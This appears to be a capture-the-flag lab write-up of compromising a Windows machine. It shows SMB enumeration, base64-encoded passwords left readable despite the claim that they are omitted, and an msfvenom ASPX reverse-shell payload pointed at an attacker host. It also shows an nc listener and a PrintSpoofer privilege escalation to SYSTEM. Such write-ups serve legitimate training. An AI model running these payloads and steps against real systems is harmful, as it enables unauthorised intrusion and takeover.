## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

**Scope of Work**

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

- User.txt
- Root.txt  
Additionally, the client has provided the following scope allowances:
- Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first  
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope
- Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)
I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.
Note - Nothing in this room requires Metasploit
Machine may take up to 5 minutes for all services to start.  
****Writeups will not be accepted for this room.****
```

## IP-Address
```IP-Address
10.201.68.152
```

## Rustscan 
```bash
$ rustscan -a 10.201.68.152  -b 450 -t 2000 --ulimit 5000 -- -e tun0  -p80
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

Open 10.201.68.152:80
Open 10.201.68.152:139
Open 10.201.68.152:135
Open 10.201.68.152:445
Open 10.201.68.152:3389
Open 10.201.68.152:49667
```

## SMB Enumeration
```bash
$ smbclient -L //10.201.68.152/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.201.68.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Got the New Dick Drive `nt4wrksv`
```bash
$ smbclient //10.201.68.152/nt4wrksv -N

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

7735807 blocks of size 4096. 4948958 blocks available
smb: \> get passwords.txt
```

## Password.txt
```bash
$ cat passwords.txt         
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk   
```

Decode this into the base64 
```bash
Bob - [password omitted]
Bill - [password omitted]
```

## Credential Testing
```bash
$crackmapexec smb 10.201.68.152 -u Bob -p '[password omitted]'
[-] Logon failure

$crackmapexec smb 10.201.68.152 -u Bill -p '[password omitted]'
[+] Authentication successful
```

## Reverse shell

```bash
$  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.36.74 LPORT=4444 -f aspx -o rev.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3422 bytes
Saved as: rev.aspx
```
upload on SMB Client as it is writable

```bash
└─$ smbclient -U Bill \\\\10.201.112.150\\nt4wrksv\\
Password for [WORKGROUP\Bill]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5066132 blocks available
smb: \> put rev.aspx
putting file rev.aspx as \rev.aspx (4.8 kb/s) (average 4.8 kb/s)
smb: \> ls
  .                                   D        0  Tue Nov 18 16:55:53 2025
  ..                                  D        0  Tue Nov 18 16:55:53 2025
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  rev.aspx                            A     3422  Tue Nov 18 16:55:53 2025
ex
                7735807 blocks of size 4096. 5066131 blocks available
smb: \> exit
```

## Browser Interact 
```Browser 
http://10.201.112.150:49663/nt4wrksv/rev.aspx
```

## Got the Reverse Shell
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.36.74] from (UNKNOWN) [10.201.112.150] 49734
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

## User Flag
```bash
c:\Users\Bob\Desktop>more user.txt
more user.txt
[flag omitted]
```


## Privilege Escalation
Lets Go for the Administrator 
first check Permissions for the Bob
```bash
c:\Users\Bob\Desktop>whoami /priv whoami /priv PRIVILEGES INFORMATION 
---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token            Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process            Disabled SeAuditPrivilege Generate security audits                              Disabled SeChangeNotifyPrivilege Bypass traverse checking                       Enabled SeImpersonatePrivilege Impersonate a client after authentication       Enabled SeCreateGlobalPrivilege Create global objects                          Enabled SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

After that we Discover that it is vulnerable to the PrintSpoofer
So lets Use it 
```github
https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
```
then 
```bash
wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
```
Next,
```bash
└─$ smbclient -U guest \\\\10.49.147.172\\nt4wrksv\\
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer.exe 
putting file PrintSpoofer.exe as \PrintSpoofer.exe (95.0 kB/s) (average 95.0 kB/s)
smb: \> ls
  .                                   D        0  Sat Nov 29 15:25:48 2025
  ..                                  D        0  Sat Nov 29 15:25:48 2025
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  PrintSpoofer.exe                    A    27136  Sat Nov 29 15:25:48 2025
  rev.aspx                            A     3403  Sat Nov 29 15:17:28 2025

7735807 blocks of size 4096. 5136759 blocks available
smb: \> exit
```

Capture Reverse shell again
```bash
$cd c:\inetpub\wwwroot\nt4wrksv>
c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

11/29/2025  12:25 PM    <DIR>          .
11/29/2025  12:25 PM    <DIR>          ..
07/25/2020  07:15 AM                98 passwords.txt
11/29/2025  12:25 PM            27,136 PrintSpoofer.exe
11/29/2025  12:17 PM             3,403 rev.aspx
               3 File(s)         30,637 bytes
               2 Dir(s)  21,040,156,672 bytes free

c:\inetpub\wwwroot\nt4wrksv>run PrintSpoofer.exe
run PrintSpoofer.exe
'run' is not recognized as an internal or external command,
operable program or batch file.

c:\inetpub\wwwroot\nt4wrksv>

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe
PrintSpoofer.exe
 [-] Please specify a command to execute

c:\inetpub\wwwroot\nt4wrksv     

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
```

Got the Administrator Access
```bash
C:\Windows\system32>whoami
whoami
nt authority\system
C:\>cd Users
cd Users

C:\Users>dir

07/25/2020  01:03 PM    <DIR>          .
07/25/2020  01:03 PM    <DIR>          ..
07/25/2020  07:05 AM    <DIR>          .NET v4.5
07/25/2020  07:05 AM    <DIR>          .NET v4.5 Classic
07/25/2020  09:30 AM    <DIR>          Administrator
07/25/2020  01:03 PM    <DIR>          Bob
07/25/2020  06:58 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  21,040,025,600 bytes free

C:\Users>cd Administrator
C:\Users\Administrator>cd Desktop    
C:\Users\Administrator\Desktop>more root.txt
more root.txt
[flag omitted]
```

## Administrator Flag
```Flag
[flag omitted]
```